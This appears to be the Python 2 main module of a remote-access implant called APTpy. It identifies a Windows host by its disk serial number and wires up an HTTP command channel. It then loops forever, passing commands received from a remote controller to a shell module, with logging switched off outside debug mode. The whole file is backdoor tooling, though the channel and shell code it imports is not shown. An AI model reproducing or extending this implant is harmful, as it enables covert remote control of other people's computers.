import logging
import logging.handlers
import Queue
import wmi
from threading import Event
from time import sleep
DEBUG = True


class APTpy:
    def __init__(self):
        self.id = None
        self.channel = None
        self.modules = []
        self.queue_send = Queue.Queue()
        self.queue_recv = Queue.Queue()
        self.events = {}

        # Logging information
        aptpy_logger = logging.getLogger('aptpy')
        aptpy_logger.setLevel(logging.DEBUG)

        # Create a rotation logging, so we won't have and endless file
        rotate = logging.handlers.RotatingFileHandler('aptpy.log', maxBytes=(5 * 1024 * 1024), backupCount=3)
        rotate.setLevel(logging.DEBUG)
        rotate.setFormatter(logging.Formatter('%(asctime)s|%(levelname)-8s| %(message)s', '%Y-%m-%d %H:%M:%S'))

        aptpy_logger.addHandler(rotate)

        console = logging.StreamHandler()
        console.setLevel(logging.DEBUG)

        console.setFormatter(logging.Formatter("%(asctime)s|%(levelname)-8s| %(message)s", '%Y-%m-%d %H:%M:%S'))
        aptpy_logger.addHandler(console)

        aptpy_logger.disabled = True

        if DEBUG:
            aptpy_logger.disabled = False

    def run(self):
        self._checkenv()
        self._registerChannels()
        self._registerModules()

        self.channel.start()

        for module in self.modules:
            module.start()

        while True:
            sleep(0.5)
            if not self.queue_recv.empty():
                cmd = self.queue_recv.get().strip()

                logging.getLogger('aptpy').info("Got command %s from the queue" % cmd)

                self.queue_recv.task_done()
                for module in self.modules:
                    if module.its_for_me(cmd):
                        className = module.__class__.__name__

                        logging.getLogger('aptpy').info("Module %s reclaimed the message" % className)

                        self.events[className].set()
                        self.events[className].clear()

    def _checkenv(self):
        info = wmi.WMI()
        disk = info.Win32_PhysicalMedia()[0].SerialNumber.strip()
        self.id = disk

    def _registerChannels(self):
        from lib.channels.http import HttpChannel

        self.channel = HttpChannel(self.queue_send, self.queue_recv)

    def _registerModules(self):
        from lib.modules.shell import ShellModule

        self.events['ShellModule'] = Event()
        self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))

try:
    obj = APTpy()
    obj.run()
except Exception, e:
    if DEBUG:
        print "[!] Operation aborted: " + str(type(e)) + e.message
